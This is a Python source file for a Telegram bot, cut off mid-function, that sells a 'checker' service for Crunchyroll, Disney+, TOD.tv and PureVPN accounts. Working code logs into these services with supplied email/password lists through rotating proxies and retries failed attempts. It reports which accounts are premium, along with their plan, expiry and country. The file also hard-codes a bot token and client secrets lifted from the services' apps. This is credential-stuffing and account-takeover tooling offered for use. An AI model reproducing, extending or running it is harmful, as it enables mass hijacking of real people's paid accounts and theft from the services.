#!/usr/bin/env python3
# filename: streaming_checker_bot.py

import requests
import json
import uuid
import random
import os
import sys
import threading
import time
import re
import sqlite3
import urllib.parse
from datetime import datetime, timedelta
from queue import Queue, Empty
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

# ============ CONFIGURATION ============
BOT_TOKEN = "8983096643:AAG_n4NAd8ndyoaw-IvyGVR1oiLZwdt0msU"
ADMIN_IDS = [8731647972]

# ============ FOOTER & ANIME PERSONALITY ============
def footer():
    return "\n\n˚ ━━━━━━━━━━━━━━━━━━━━━━ ˚\n✦ Developed by @iam_esh ♡\n˚ ━━━━━━━━━━━━━━━━━━━━━━ ˚"

# Raw API helper for colored buttons (Bot API 9.4 style field)
import requests as _raw_requests

BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_colored_message(chat_id, text, keyboard_rows=None, parse_mode="HTML"):
    """Send a message with colored inline buttons using raw Bot API."""
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if keyboard_rows:
        payload["reply_markup"] = json.dumps({"inline_keyboard": keyboard_rows})
    try:
        _raw_requests.post(f"{BASE_URL}/sendMessage", json=payload, timeout=10)
    except Exception as e:
        print(f"send_colored_message error: {e}")

def edit_colored_message(chat_id, message_id, text, keyboard_rows=None, parse_mode="HTML"):
    """Edit a message with colored inline buttons using raw Bot API."""
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode,
    }
    if keyboard_rows:
        payload["reply_markup"] = json.dumps({"inline_keyboard": keyboard_rows})
    try:
        _raw_requests.post(f"{BASE_URL}/editMessageText", json=payload, timeout=10)
    except Exception as e:
        print(f"edit_colored_message error: {e}")

def get_colored_keyboard():
    """Main keyboard with aesthetic line emojis and Bot API 9.4 colored buttons."""
    return [
        [
            {"text": "⟡ Crunchyroll", "callback_data": "service_crunchyroll", "style": "primary"},
            {"text": "◈ Disney+", "callback_data": "service_disney", "style": "primary"},
        ],
        [
            {"text": "▸ TOD.tv", "callback_data": "service_tod", "style": "primary"},
            {"text": "✧ PureVPN", "callback_data": "service_purevpn", "style": "primary"},
        ],
        [
            {"text": "˚ Single Check", "callback_data": "action_single", "style": "success"},
            {"text": "⊹ Mass Check", "callback_data": "action_mass", "style": "success"},
        ],
        [
            {"text": "✦ My Stats", "callback_data": "action_stats", "style": "primary"},
            {"text": "🎀 Buy VIP ♡", "callback_data": "action_vip", "style": "success"},
        ],
        [
            {"text": "⌗ Cancel Check", "callback_data": "action_cancel", "style": "danger"},
            {"text": "🌸 Help", "callback_data": "action_help", "style": "primary"},
        ],
    ]

# VIP Plan Configuration
VIP_PRICE = 5  # USD
VIP_DURATION_DAYS = 30
FREE_DAILY_LIMIT = 1000  # Free users can check 1000 accounts per day

# Thread Configuration
MASS_CHECK_THREADS = 5  # Number of parallel checks for mass checking
SINGLE_CHECK_TIMEOUT = 30  # Seconds per single check
PROXY_TEST_THREADS = 10  # Threads for testing proxies

# ============ DATABASE SETUP ============
def init_database():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        plan TEXT DEFAULT 'free',
        vip_expiry TEXT,
        daily_checks INTEGER DEFAULT 0,
        last_check_date TEXT,
        join_date TEXT,
        total_checks INTEGER DEFAULT 0
    )''')
    
    # Proxy table (shared across users)
    c.execute('''CREATE TABLE IF NOT EXISTS proxies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        proxy TEXT UNIQUE,
        is_bad INTEGER DEFAULT 0,
        added_by INTEGER,
        added_date TEXT
    )''')
    
    # Payment table
    c.execute('''CREATE TABLE IF NOT EXISTS payments (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        amount REAL,
        transaction_id TEXT,
        status TEXT DEFAULT 'pending',
        created_date TEXT
    )''')
    
    conn.commit()
    conn.close()

init_database()

# ============ USER MANAGEMENT ============
class UserManager:
    def __init__(self):
        self.user_cache = {}
    
    def get_user(self, user_id):
        if user_id in self.user_cache:
            return self.user_cache[user_id]
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        conn.close()
        
        if user:
            # Database column order:
            # 0: user_id, 1: username, 2: first_name, 3: plan, 4: vip_expiry, 
            # 5: daily_checks, 6: last_check_date, 7: join_date, 8: total_checks
            user_dict = {
                'user_id': user[0],
                'username': user[1],
                'first_name': user[2],
                'plan': user[3],
                'vip_expiry': user[4],
                'daily_checks': int(user[5]) if user[5] is not None else 0,
                'last_check_date': user[6],
                'join_date': user[7],
                'total_checks': int(user[8]) if user[8] is not None else 0
            }
            self.user_cache[user_id] = user_dict
            return user_dict
        return None
    
    def register_user(self, user_id, username, first_name):
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        c.execute("""INSERT OR IGNORE INTO users 
                    (user_id, username, first_name, plan, join_date, daily_checks, total_checks)
                    VALUES (?, ?, ?, 'free', ?, 0, 0)""",
                  (user_id, username, first_name, current_date))
        conn.commit()
        conn.close()
        
        self.user_cache[user_id] = {
            'user_id': user_id,
            'username': username,
            'first_name': first_name,
            'plan': 'free',
            'vip_expiry': None,
            'daily_checks': 0,
            'last_check_date': None,
            'join_date': current_date,
            'total_checks': 0
        }
    
    def can_check(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return True, "User not found"
        
        # VIP users have no limit
        if user['plan'] == 'vip':
            # Check if VIP expired
            if user['vip_expiry']:
                try:
                    expiry = datetime.strptime(user['vip_expiry'], "%Y-%m-%d %H:%M:%S")
                    if datetime.now() > expiry:
                        self.set_plan(user_id, 'free')
                        return False, "Your VIP plan has expired. Please renew."
                except:
                    pass
            return True, "VIP User - No limits"
        
        # Free users have daily limit
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_check_date'] != today:
            # Reset daily checks
            conn = sqlite3.connect('users.db')
            c = conn.cursor()
            c.execute("UPDATE users SET daily_checks = 0, last_check_date = ? WHERE user_id = ?", 
                     (today, user_id))
            conn.commit()
            conn.close()
            user['daily_checks'] = 0
            user['last_check_date'] = today
        
        if user['daily_checks'] >= FREE_DAILY_LIMIT:
            return False, f"Daily limit reached! You can check {FREE_DAILY_LIMIT} accounts per day. Upgrade to VIP for unlimited checks."
        
        return True, f"{FREE_DAILY_LIMIT - user['daily_checks']} checks remaining today"
    
    def increment_checks(self, user_id, count=1):
        user = self.get_user(user_id)
        if not user:
            return
        
        # Ensure values are integers
        current_daily = int(user['daily_checks']) if user['daily_checks'] is not None else 0
        current_total = int(user['total_checks']) if user['total_checks'] is not None else 0
        
        today = datetime.now().strftime("%Y-%m-%d")
        new_daily_count = current_daily + count
        new_total_count = current_total + count
        
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("""UPDATE users 
                    SET daily_checks = ?, last_check_date = ?, total_checks = ?
                    WHERE user_id = ?""", 
                 (new_daily_count, today, new_total_count, user_id))
        conn.commit()
        conn.close()
        
        # Update cache
        user['daily_checks'] = new_daily_count
        user['last_check_date'] = today
        user['total_checks'] = new_total_count
    
    def set_plan(self, user_id, plan, days=None):
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        
        expiry = None
        if plan == 'vip' and days:
            expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
        
        c.execute("UPDATE users SET plan = ?, vip_expiry = ? WHERE user_id = ?", 
                 (plan, expiry, user_id))
        conn.commit()
        conn.close()
        
        if user_id in self.user_cache:
            self.user_cache[user_id]['plan'] = plan
            self.user_cache[user_id]['vip_expiry'] = expiry
    
    def get_user_stats(self, user_id):
        user = self.get_user(user_id)
        if not user:
            return None
        
        daily_checks = int(user['daily_checks']) if user['daily_checks'] is not None else 0
        total_checks = int(user['total_checks']) if user['total_checks'] is not None else 0
        
        remaining = FREE_DAILY_LIMIT - daily_checks
        if user['plan'] == 'vip':
            remaining = "Unlimited"
        
        return {
            'plan': user['plan'],
            'used_today': daily_checks,
            'remaining': remaining,
            'total_checks': total_checks,
            'vip_expiry': user['vip_expiry']
        }

user_manager = UserManager()

# ============ PROXY MANAGER ============
class ProxyManager:
    def __init__(self):
        self.proxies_cache = []
        self.bad_proxies = set()
        self.load_proxies()
    
    def load_proxies(self):
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("SELECT proxy FROM proxies WHERE is_bad = 0")
        proxies = c.fetchall()
        conn.close()
        self.proxies_cache = [p[0] for p in proxies]
    
    def add_proxy(self, proxy, added_by):
        try:
            conn = sqlite3.connect('users.db')
            c = conn.cursor()
            c.execute("INSERT OR IGNORE INTO proxies (proxy, added_by, added_date) VALUES (?, ?, ?)",
                     (proxy, added_by, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            conn.commit()
            conn.close()
            if proxy not in self.proxies_cache:
                self.proxies_cache.append(proxy)
            return True
        except:
            return False
    
    def mark_bad(self, proxy):
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("UPDATE proxies SET is_bad = 1 WHERE proxy = ?", (proxy,))
        conn.commit()
        conn.close()
        if proxy in self.proxies_cache:
            self.proxies_cache.remove(proxy)
        self.bad_proxies.add(proxy)
    
    def get_random_proxy(self):
        if not self.proxies_cache:
            return None, None
        proxy = random.choice(self.proxies_cache)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}, proxy
    
    def get_all_proxies(self):
        return self.proxies_cache
    
    def clear_bad(self):
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("UPDATE proxies SET is_bad = 0")
        conn.commit()
        conn.close()
        self.load_proxies()
        self.bad_proxies.clear()
        return len(self.proxies_cache)

proxy_manager = ProxyManager()

# ============ COLORS FOR CONSOLE ============
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'

# ============ CRUNCHYROLL CHECKER ============
class CrunchyrollChecker:
    def __init__(self, bot_token=None, chat_id=None, proxies=None):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.proxies = proxies if proxies else []
        self._tg_init = False
        self._vid = "https://t.me/videotoolbaron/3"
        self.bad_proxies = set()
        
        self.countries = {
            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
            "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
            "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
            "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
            "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
            "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
            "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
            "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
            "CU": "Cuba 🇨🇺", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
            "DK": "Denmark 🇩🇰", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨",
            "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "EE": "Estonia 🇪🇪",
            "ET": "Ethiopia 🇪🇹", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
            "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GR": "Greece 🇬🇷",
            "GT": "Guatemala 🇬🇹", "HT": "Haiti 🇭🇹", "HN": "Honduras 🇭🇳",
            "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
            "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷",
            "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IL": "Israel 🇮🇱",
            "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵",
            "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
            "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻",
            "LB": "Lebanon 🇱🇧", "LY": "Libya 🇱🇾", "LT": "Lithuania 🇱🇹",
            "LU": "Luxembourg 🇱🇺", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
            "MA": "Morocco 🇲🇦", "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿",
            "NG": "Nigeria 🇳🇬", "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲",
            "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦", "PE": "Peru 🇵🇪",
            "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
            "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
            "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
            "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
            "ZA": "South Africa 🇿🇦", "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰",
            "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼",
            "TH": "Thailand 🇹🇭", "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦",
            "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧",
            "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "VE": "Venezuela 🇻🇪",
            "VN": "Vietnam 🇻🇳"
        }
    
    def _get_random_proxy(self):
        if not self.proxies:
            return None
        available_proxies = [p for p in self.proxies if p not in self.bad_proxies]
        if not available_proxies:
            self.bad_proxies.clear()
            available_proxies = self.proxies
        proxy = random.choice(available_proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def mark_proxy_bad(self, proxy_dict):
        if proxy_dict:
            for key, value in proxy_dict.items():
                if 'http://' in value:
                    proxy = value.replace('http://', '')
                    self.bad_proxies.add(proxy)
                    break
    
    def test_proxy(self, proxy_string):
        try:
            proxy_dict = {'http': f'http://{proxy_string}', 'https': f'http://{proxy_string}'}
            test_session = requests.Session()
            test_session.proxies.update(proxy_dict)
            test_session.timeout = 10
            
            test_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            test_headers = {
                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            test_data = {
                'grant_type': 'client_credentials',
                'client_id': 'y2arvjb0h0rgvtizlovy',
                'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2'
            }
            
            response = test_session.post(test_url, headers=test_headers, data=test_data, timeout=10)
            if response.status_code in [200, 400, 401, 403]:
                return True
            return False
        except:
            return False
    
    def check(self, email, password, retry_count=0):
        device_id = str(uuid.uuid4())
        session = requests.Session()
        
        proxy = self._get_random_proxy()
        current_proxy = None
        if proxy:
            session.proxies.update(proxy)
            current_proxy = proxy
        
        url = "https://beta-api.crunchyroll.com/auth/v1/token"
        
        headers = {
            'host': 'beta-api.crunchyroll.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
        }
        
        data = {
            'grant_type': 'password',
            'username': email,
            'password': password,
            'scope': 'offline_access',
            'client_id': 'y2arvjb0h0rgvtizlovy',
            'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
            'device_type': 'Baron',
            'device_id': device_id,
            'device_name': 'Baron'
        }
        
        try:
            response = session.post(url, headers=headers, data=data, timeout=15)
            response_text = response.text
            
            if any(x in response_text for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400", "missing_required_field"]):
                return {'status': 'INVALID', 'email': email, 'password': password, 'service': 'Crunchyroll', 'message': 'Invalid credentials'}
            
            if '"access_token"' not in response_text:
                if current_proxy and retry_count < 2:
                    self.mark_proxy_bad(current_proxy)
                    return self.check(email, password, retry_count + 1)
                return {'status': 'INVALID', 'email': email, 'password': password, 'service': 'Crunchyroll', 'message': 'Login failed'}
            
            data = response.json()
            access_token = data.get('access_token')
            
            if not access_token:
                return {'status': 'INVALID', 'email': email, 'password': password, 'service': 'Crunchyroll', 'message': 'No access token'}
            
            headers = {
                'authorization': f'Bearer {access_token}',
                'connection': 'Keep-Alive',
                'host': 'beta-api.crunchyroll.com',
                'user-agent': 'AppleCoreMedia/1.0.0.20L563 (Apple TV; U; CPU OS 16_5 like Mac OS X; en_us)'
            }
            
            response = session.get('https://beta-api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15)
            account_data = response.json()
            
            email_verified = account_data.get('email_verified', False)
            created = account_data.get('created', '').split('T')[0]
            external_id = account_data.get('external_id')
            
            response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products', headers=headers, timeout=15)
            products_data = response.json()
            
            plan = "Free"
            currency = "N/A"
            subscribable = "False"
            free_trial = "False"
            
            if 'items' in products_data and len(products_data['items']) > 0:
                item = products_data['items'][0]
                plan = item.get('product', {}).get('sku', 'Unknown')
                currency = item.get('currency_code', 'N/A')
                subscribable = str(item.get('product', {}).get('is_subscribable', False))
                free_trial = str(item.get('active_free_trial', False))
            
            response = session.get(f'https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}', headers=headers, timeout=15)
            sub_data = response.json()
            
            expiry = sub_data.get('next_renewal_date', 'N/A')
            if expiry and 'T' in expiry:
                expiry = expiry.split('T')[0]
            
            plan_duration = sub_data.get('cycle_duration', 'N/A')
            is_active = str(sub_data.get('is_active', False))
            country_code = sub_data.get('country_code', 'US')
            country = self.countries.get(country_code, f"{country_code} 🌍")
            is_cancelled = sub_data.get('is_cancelled', False)
            
            if is_cancelled or subscribable == "False":
                status = "FREE"
            elif subscribable == "True":
                status = "PREMIUM"
            else:
                status = "FREE"
            
            return {
                'status': status,
                'service': 'Crunchyroll',
                'email': email,
                'password': password,
                'email_verified': email_verified,
                'account_creation_date': created,
                'plan': plan,
                'currency': currency,
                'subscribable': subscribable,
                'free_trial': free_trial,
                'expiry': expiry,
                'plan_duration': plan_duration,
                'active': is_active,
                'country': country
            }
            
        except Exception as e:
            if current_proxy and retry_count < 2:
                self.mark_proxy_bad(current_proxy)
                return self.check(email, password, retry_count + 1)
            return {'status': 'ERROR', 'email': email, 'password': password, 'service': 'Crunchyroll', 'message': str(e)}

# ============ DISNEY+ CHECKER ============
class DisneyPlusChecker:
    def __init__(self, proxies=None, debug=False):
        self.proxies = proxies if proxies else []
        self.bad_proxies = set()
        self.debug = debug
        
    def log_debug(self, message, data=None):
        if self.debug:
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            print(f"{Colors.CYAN}[DEBUG {timestamp}]{Colors.RESET} {message}")
            if data:
                print(f"{Colors.GRAY}{str(data)[:500]}{Colors.RESET}")
    
    def _get_random_proxy(self):
        if not self.proxies:
            return None, None
        available_proxies = [p for p in self.proxies if p not in self.bad_proxies]
        if not available_proxies:
            self.log_debug("No good proxies left, resetting bad proxies list")
            self.bad_proxies.clear()
            available_proxies = self.proxies
        proxy = random.choice(available_proxies)
        self.log_debug(f"Selected proxy: {proxy[:50]}...")
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}, proxy
    
    def mark_proxy_bad(self, proxy_str):
        if proxy_str:
            self.bad_proxies.add(proxy_str)
            self.log_debug(f"Marked proxy as bad: {proxy_str[:50]}...")
    
    def test_proxy(self, proxy_string):
        self.log_debug(f"Testing proxy: {proxy_string[:50]}...")
        try:
            proxy_dict = {'http': f'http://{proxy_string}', 'https': f'http://{proxy_string}'}
            test_session = requests.Session()
            test_session.proxies.update(proxy_dict)
            test_session.timeout = 10
            
            test_url = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
            test_headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json'
            }
            test_data = {
                "query": "mutation registerDevice($input: RegisterDeviceInput!) { registerDevice(registerDevice: $input) { grant { grantType assertion } } }",
                "operationName": "registerDevice",
                "variables": {
                    "input": {
                        "deviceFamily": "browser",
                        "applicationRuntime": "chrome",
                        "deviceProfile": "windows",
                        "deviceLanguage": "en-US",
                        "attributes": {
                            "osDeviceIds": [],
                            "manufacturer": "microsoft",
                            "model": None,
                            "operatingSystem": "windows",
                            "operatingSystemVersion": "10.0",
                            "browserName": "chrome",
                            "browserVersion": "107.0.0",
                            "brand": "web"
                        },
                        "devicePlatformId": "browser"
                    }
                }
            }
            
            response = test_session.post(test_url, headers=test_headers, json=test_data, timeout=10)
            self.log_debug(f"Proxy test response status: {response.status_code}")
            
            if response.status_code in [200, 400, 401, 403]:
                self.log_debug(f"Proxy test PASSED - Status: {response.status_code}")
                return True
            self.log_debug(f"Proxy test FAILED - Status: {response.status_code}")
            return False
        except Exception as e:
            self.log_debug(f"Proxy test FAILED - Exception: {str(e)[:100]}")
            return False
    
    def register_device(self, session):
        self.log_debug("Starting device registration...")
        url = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql"
        
        headers = {
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'x-dss-edge-accept': 'vnd.dss.edge+json; version=2',
            'x-bamsdk-client-id': 'disney-svod-3d9324fc',
            'x-application-version': '1.1.2',
            'sec-ch-ua-mobile': '?0',
            'authorization': 'ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'x-bamsdk-platform-id': 'browser',
            'x-bamsdk-platform': 'javascript/windows/chrome',
            'accept': 'application/json',
            'x-bamsdk-version': '20.0',
            'sec-ch-ua-platform': '"Windows"',
            'Origin': 'https://www.disneyplus.com',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.disneyplus.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'es-419,es;q=0.9',
            'Content-Type': 'application/json'
        }
        
        data = {
            "query": "mutation registerDevice($input: RegisterDeviceInput!) { registerDevice(registerDevice: $input) { grant { grantType assertion } } }",
            "operationName": "registerDevice",
            "variables": {
                "input": {
                    "deviceFamily": "browser",
                    "applicationRuntime": "chrome",
                    "deviceProfile": "windows",
                    "deviceLanguage": "es-419",
                    "attributes": {
                        "osDeviceIds": [],
                        "manufacturer": "microsoft",
                        "model": None,
                        "operatingSystem": "windows",
                        "operatingSystemVersion": "10.0",
                        "browserName": "chrome",
                        "browserVersion": "107.0.0",
                        "brand": "web"
                    },
                    "devicePlatformId": "browser"
                }
            }
        }
        
        try:
            self.log_debug("Sending device registration request...")
            response = session.post(url, headers=headers, json=data, timeout=15)
            self.log_debug(f"Device registration response status: {response.status_code}")
            response_text = response.text
            self.log_debug(f"Response preview: {response_text[:300]}...")
            
            if 'accessToken' in response_text:
                match = re.search(r'accessToken":"([^"]+)"', response_text)
                if match:
                    token = match.group(1)
                    self.log_debug(f"Device registration SUCCESS - Token obtained: {token[:30]}...")
                    return token
            self.log_debug("Device registration FAILED - No access token in response")
            return None
        except Exception as e:
            self.log_debug(f"Device registration EXCEPTION: {str(e)}")
            return None
    
    def check(self, email, password, retry_count=0):
        self.log_debug(f"\n{'='*60}")
        self.log_debug(f"Checking Disney+ account: {email}")
        self.log_debug(f"Retry count: {retry_count}")
        
        session = requests.Session()
        
        proxy_dict, proxy_str = self._get_random_proxy() if self.proxies else (None, None)
        if proxy_dict:
            session.proxies.update(proxy_dict)
            self.log_debug(f"Using proxy for this request")
        
        try:
            self.log_debug("STEP 1: Device Registration")
            token = self.register_device(session)
            
            if not token:
                self.log_debug("STEP 1 FAILED: Could not get device token")
                if proxy_str and retry_count < 2:
                    self.log_debug(f"Retrying with different proxy (attempt {retry_count + 1}/2)")
                    self.mark_proxy_bad(proxy_str)
                    return self.check(email, password, retry_count + 1)
                return {'status': 'ERROR', 'email': email, 'password': password, 'service': 'Disney+', 'message': 'Failed to register device'}
            
            self.log_debug("STEP 1 SUCCESS: Device registered successfully")
            
            self.log_debug("STEP 2: Login with credentials")
            url = "https://disney.api.edge.bamgrid.com/v1/public/graphql"
            
            headers = {
                'Host': 'disney.api.edge.bamgrid.com',
                'Connection': 'keep-alive',
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'x-dss-edge-accept': 'vnd.dss.edge+json; version=2',
                'x-bamsdk-client-id': 'disney-svod-3d9324fc',
                'x-application-version': '1.1.2',
                'sec-ch-ua-mobile': '?0',
                'authorization': token,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
                'x-bamsdk-platform-id': 'browser',
                'content-type': 'application/json',
                'x-bamsdk-platform': 'javascript/windows/chrome',
                'accept': 'application/json',
                'x-bamsdk-version': '20.0',
                'sec-ch-ua-platform': '"Windows"',
                'Origin': 'https://www.disneyplus.com',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty',
                'Referer': 'https://www.disneyplus.com/',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Accept-Encoding': 'gzip, deflate'
            }
            
            query = """mutation login($input: LoginInput!) {
                login(login: $input) {
                    account {
                        id
                        attributes {
                            email
                            emailVerified
                            locations {
                                registration {
                                    geoIp {
                                        country
                                    }
                                }
                            }
                        }
                        profiles {
                            id
                            name
                        }
                    }
                    identity {
                        subscriber {
                            subscriberStatus
                            subscriptions {
                                id
                                state
                                isEntitled
                                product {
                                    name
                                    sku
                                }
                                term {
                                    expiryDate
                                    nextRenewalDate
                                    isFreeTrial
                                }
                            }
                        }
                    }
                    activeSession {
                        isSubscriber
                        location {
                            countryCode
                        }
                    }
                }
            }"""
            
            data = {
                "query": query,
                "operationName": "login",
                "variables": {
                    "input": {
                        "email": email,
                        "password": password
                    }
                }
            }
            
            self.log_debug(f"Sending login request for {email}")
            response = session.post(url, headers=headers, json=data, timeout=15)
            response_text = response.text
            self.log_debug(f"Login response status: {response.status_code}")
            self.log_debug(f"Response preview: {response_text[:500]}...")
            
            if any(x in response_text.lower() for x in ["bad credentials", "invalid credentials"]):
                self.log_debug("LOGIN FAILED: Bad credentials")
                return {'status': 'INVALID', 'email': email, 'password': password, 'service': 'Disney+', 'message': 'Invalid credentials'}
            
            if "password reset required" in response_text.lower():
                self.log_debug("LOGIN FAILED: Password reset required")
                return {'status': 'PASSWORD_RESET', 'email': email, 'password': password, 'service': 'Disney+', 'message': 'Password reset required'}
            
            if 'accessToken' not in response_text and 'isSubscriber' not in response_text:
                self.log_debug("LOGIN FAILED: No access token or subscriber info in response")
                if proxy_str and retry_count < 2:
                    self.log_debug(f"Retrying with different proxy (attempt {retry_count + 1}/2)")
                    self.mark_proxy_bad(proxy_str)
                    return self.check(email, password, retry_count + 1)
                return {'status': 'INVALID', 'email': email, 'password': password, 'service': 'Disney+', 'message': 'Login failed'}
            
            self.log_debug("STEP 2 SUCCESS: Login successful")
            
            self.log_debug("STEP 3: Parsing account information")
            email_verified = 'emailVerified":true' in response_text or 'emailVerified": true' in response_text
            self.log_debug(f"Email verified: {email_verified}")
            
            country = "Unknown"
            country_match = re.search(r'country[\\"]*[:\s]*[\\"]*([A-Z]{2})', response_text)
            if country_match:
                country = country_match.group(1)
                self.log_debug(f"Country detected: {country}")
            else:
                self.log_debug("Country not detected in response")
            
            plan = "Free"
            free_trial = "False"
            next_renewal = "N/A"
            is_subscriber = 'isSubscriber":true' in response_text or 'isSubscriber": true' in response_text
            self.log_debug(f"Is subscriber: {is_subscriber}")
            
            if is_subscriber:
                self.log_debug("Parsing subscription details...")
                if 'isFreeTrial":true' in response_text or 'isFreeTrial": true' in response_text:
                    free_trial = "True"
                    self.log_debug("Free trial: ACTIVE")
                
                plan_match = re.search(r'product[\s\S]*?name[\\"]*[:\s]*[\\"]*([^\\"]+)', response_text)
                if plan_match:
                    plan = plan_match.group(1)
                    self.log_debug(f"Plan detected: {plan}")
                else:
                    self.log_debug("Plan not detected in response")
                
                renewal_match = re.search(r'nextRenewalDate[\\"]*[:\s]*[\\"]*([0-9-]+)', response_text)
                if renewal_match:
                    next_renewal = renewal_match.group(1)
                    self.log_debug(f"Next renewal date: {next_renewal}")
                else:
